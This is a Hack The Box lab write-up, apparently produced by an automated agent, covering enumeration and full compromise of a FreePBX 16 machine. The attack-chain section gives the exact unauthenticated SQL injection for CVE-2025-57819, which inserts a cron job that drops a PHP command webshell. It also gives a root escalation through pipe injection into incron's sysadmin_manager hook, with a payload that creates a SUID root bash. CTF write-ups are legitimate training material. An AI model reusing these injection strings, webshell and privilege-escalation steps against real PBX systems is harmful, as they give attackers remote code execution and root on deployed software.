# HTB "Connected" (10.129.245.100) — Enumeration Notes

> **STATUS: OWNED (user + root).** user.txt `ecdd0d8d1b25e4f56f97a76529d1ab16` (submitted OK), root.txt `f428481f7a645562d6937287719c2a44` (submitted OK, machine_pwned:true). Full attack chain at bottom of file.

## Application Identity

- **FreePBX 16.0.40.7** (Sangoma) — open-source PBX web GUI for Asterisk
  - Version confirmed via `load_version=16.0.40.7` asset params and footer on `/admin/config.php`
  - Released 2024-02-07 (SNG7-PBX16-64bit-2306-1 release line)
- **UCP (User Control Panel) module v16.0.38.1** at `/ucp/`
- Stack: CentOS 7, Apache 2.4.6, PHP 7.4.16, OpenSSL 1.0.2k-fips
- SSH: OpenSSH 7.4 (banner only, per nmap)

## Hostnames / Vhosts

| Name | Source | Notes |
|---|---|---|
| `connected.htb` | 301 redirect from `http://10.129.245.100/` | Primary vhost on port 80 |
| `pbxconnect` | TLS cert CN + `emailAddress=root@pbxconnect` | Self-signed cert, no SANs; likely internal hostname |

**/etc/hosts: NOT added** — `sudo -n` failed (password required). User must add:

```
10.129.245.100 connected.htb pbxconnect
```

Workaround used meanwhile: `curl --resolve connected.htb:80:10.129.245.100` / `:443:`.
Vhost behavior: port 80 (any Host) 301s to `http://connected.htb/`; both `connected.htb:80` and `IP:443` serve the identical FreePBX app (`/` 302 → `/admin` → `/admin/` → `config.php`). No content difference between vhosts/schemes observed.

## Live Endpoints (single targeted requests, no wordlist scanning)

| Endpoint | Scheme | Status | Notes |
|---|---|---|---|
| `/` | 80 (IP) | 301 → `http://connected.htb/` | |
| `/` | 80/443 (vhost/IP) | 302 → `/admin` | |
| `/admin/` | both | 302 → `config.php` | |
| `/admin/config.php` | both | 200 | **FreePBX admin login** (10,430 B) |
| `/ucp/` | 443 | 200 | **UCP login** (7,453 B), module v16.0.38.1 |
| `/admin/ajax.php` | 443 | 403 | `{"error":"ajaxRequest declined"}` unauth — FreePBX AJAX handler (CVE-2025-57819 entry point) |
| `/admin/cxpanel/` | 443 | 200 | iSymphonyV3 panel: "Offline system! Failed connect to 10.129.245.100:58080; Connection refused" — iSymphony service down |
| `/robots.txt` | both | 200 | `Disallow: /` (stock FreePBX robots, references `/www/images/`) |
| `/server-status`, `/.git/HEAD`, `/.env`, `/phpinfo.php`, `/info.php`, `/composer.json`, `/package.json`, `/index.php~`, `/config.php.bak`, `/admin/config.php.bak`, `/sitemap.xml`, `/recordings/` | 443 | 404 | nothing exposed |
| `/admin/modules/{endpoint,userman,core}/module.xml`, `/admin/modules/endpoint/assets/` | 443 | 403 | uniform 403 via .htaccess — **cannot confirm/deny endpoint module presence** this way |

Cookies: `PHPSESSID` (path=/, 30-day expiry), `lang=en_US`. Login page echoes session id in `<div id="key">`.

## Form / Parameter Map

### 1. FreePBX Admin login — `POST /admin/config.php`
- Params: `username`, `password` (form id `loginform`, no CSRF token)
- Failed login: HTTP 200, page re-rendered with `<span class="obe_error">…Invalid Username or Password</span>` (generic — no user enumeration via message)
- Single-quote probe in `username`: byte-identical response (10,556 B), no SQL error leakage

### 2. UCP login — `POST /ucp/?display=dashboard`
- Params: `token` (per-session CSRF, from GET `/ucp/`), `username`, `password`, `rememberme` (checkbox); forgot-password mode swaps to `email`
- Failed login: HTTP 200, login page re-rendered (7,453 B, same as fresh GET); error displayed via JS/session. Failed logins are **slow** (~1-2 min observed per POST chain) — likely artificial delay; brute force impractical anyway
- Single-quote probe in `username`: identical response, no error leakage
- **Info disclosure:** UCP footer leaks internal/secondary IP `10.10.15.143` and session id in `.extra-info` divs

## Suspected Vulnerabilities (ranked)

1. **CVE-2025-57819 — FreePBX endpoint module: unauth auth-bypass → SQLi → RCE (CRITICAL)**
   - Evidence: FreePBX 16.0.40.7 (2024-02); vuln affects endpoint module < 16.0.89 on FreePBX 16 (GHSA-m42g-xg4c-5f3h, published 2025-08-28, exploited in the wild since 2025-08-21). Version is far below the patch.
   - Entry point: unauthenticated requests to `/admin/ajax.php` (confirmed present, 403 to plain GET as expected).
   - Caveat: requires commercial `endpoint` module installed — direct confirmation blocked by uniform 403s, but this machine is built around this CVE (public writeups exist for this exact box/version).
   - Public exploit: watchTowr Labs PoC (`watchTowr-vs-FreePBX-CVE-2025-57819`). Chain per research: SQLi → insert malicious cron job into FreePBX DB → cron (~2 min) drops PHP webshell in `/var/www/html/` → shell as asterisk user.
2. **Privesc: incron + sysadmin hook signature bypass** (post-exploitation, per public writeups): `sysadmin_manager` validates hooks against SHA256 in a writable `module.sig` → patch sig → incron executes backdoored hook as root.
3. **iSymphony (cxpanel) on port 58080** — service installed but connection refused; if it starts, historically buggy (auth bypass). Low priority while down.
4. **UCP forgot-password (`email` param)** — unauthenticated password-reset flow; worth behavior-probing later (user enum / reset token weaknesses). Not tested beyond page load.
5. **Info disclosure**: internal IP `10.10.15.143` in UCP footer (useful if pivoting).

## Recommended Attack Path

1. Verify endpoint module / exploitability, then run CVE-2025-57819 PoC against `http://connected.htb/admin/ajax.php` → cron-injected webshell → reverse shell (asterisk user). *(Exploitation = next phase, separate agent.)*
2. Privesc via incron/sysadmin `module.sig` SHA256 signature bypass → root.
3. Fallbacks if endpoint module absent: UCP reset-flow probing, cxpanel (if 58080 comes up), SSH password spraying (last resort, out of current scope).

## Loot

`loot/` contains: full TLS cert (`tls_cert.txt`), all fetched pages + headers (`config443.html` = admin login, `probe_ucp_.out` = UCP login), login behavior samples (`login_dummy.html`, `login_quote.html`, `ucp_login_*.json`), robots.txt, 404/403 probe responses, working exploit (`exploit.py`), and privesc enum (`privesc-enum.txt`).

---

# FULL ATTACK CHAIN (completed)

## 1. RCE as `asterisk` — CVE-2025-57819 (FreePBX endpoint SQLi → cron RCE)

- **Entry:** unauth GET `/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=<SQLi>`. Confirmed injectable: `brand=x'` → SQL syntax error; `brand=x' -- ` → restored normal response.
- **Exploit (saved `loot/exploit.py`):** stacked-query SQLi in `brand` inserts a row into the FreePBX `cron_jobs` table:
  - `';INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','<job>','echo "<b64 webshell>"|base64 -d >/var/www/html/<shell>.php',NULL,'* * * * *',30,1,1) -- `
  - FreePBX cron runs the row (~≤60s), dropping a PHP webshell `<?php system($_GET['cmd']); ?>` into `/var/www/html/`.
  - Poll `/<shell>.php?cmd=id` until 200 → RCE as `asterisk`. Then a second SQLi `DELETE FROM cron_jobs WHERE jobname='<job>'` cleans up.
- **Proof:** `id` → `uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)`.

## 2. User flag

- `/home/asterisk/user.txt` → `ecdd0d8d1b25e4f56f97a76529d1ab16`. Submitted via `own.sh 906 connected user` → success.

## 3. Privesc to root — incron + `sysadmin_manager` hook **parameter pipe-injection**

**Mechanism (the intended-but-finicky sig bypass was NOT needed):**
- `/etc/incron.d/sysadmin`: `/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#` → runs `sysadmin_manager <filename>` **as root** whenever a file is written into `/var/spool/asterisk/incron/` (which is `asterisk`-writable).
- `sysadmin_manager` (PHP) accepts a trigger filename of the form `module.hook.CONTENTS`. With `.CONTENTS` it reads up to 4KB of the trigger file's *content* into `$params`, then after a GPG/SHA256 sig check on the hook it runs `system("$hookfile $params")`.
- **Param filter is permissive:** it only rejects `` ` ' " $ > < & ; `` and non-printables — critically it **allows the pipe `|`**. So `system()` (which uses `sh -c`) interprets `$params` as shell.
- **Exploit:** write trigger `/var/spool/asterisk/incron/core.logrotate.CONTENTS` containing `x | /var/www/html/.evil.sh`. This runs `system(".../core/hooks/logrotate x | /var/www/html/.evil.sh")` as root → `sh` pipes the (validly-signed, unmodified) `core/logrotate` hook into our payload → **our payload executes as root**. No signature tampering required — the legit Sangoma-signed `core` hook is used as the vehicle.

**Two gotchas that had to be solved:**
1. **The sig-bypass path (patch `module.sig` / own-key sign) fails as root.** Root's `sysadmin_manager` GPG check (`\\Sysadmin\\GPG`, IonCube-encoded in `/usr/lib/sysadmin/includes.php`) rejects tampered/non-whitelisted sigs even though the same check run manually as `asterisk` is lenient. A TOCTOU race on the real hook file (link/rename flipper in C, hundreds of triggers) also never won. → Abandoned in favor of deterministic param injection.
2. **incron's root process has a private `/tmp` (PrivateTmp).** A payload at `/tmp/evil` was invisible to the root process, and root-side `/tmp` writes were invisible to us. Fix: place the payload in the **shared webroot** `/var/www/html/.evil.sh` and write outputs there too.

**Payload (`/var/www/html/.evil.sh`, shared location, absolute PATH):**
```bash
#!/bin/bash
export PATH=/usr/sbin:/usr/bin:/sbin:/bin
cp /bin/bash /var/www/html/.rb && chmod 4755 /var/www/html/.rb   # SUID root bash
cat /root/root.txt > /var/www/html/.rf                            # exfil root flag to shared webroot
```

## 4. Root flag

- Trigger fired → `/var/www/html/.rb` (`-rwsr-xr-x root root`) and `/var/www/html/.rf` created.
- Root flag: `cat /var/www/html/.rf` → `f428481f7a645562d6937287719c2a44`.
- Root shell proof: `/var/www/html/.rb -p -c id` → `uid=999(asterisk) gid=1000(asterisk) euid=0(root)`.
- Submitted via `own.sh 906 connected root` → "Connected root is now owned", `machine_pwned:true`. **BOX COMPLETE.**
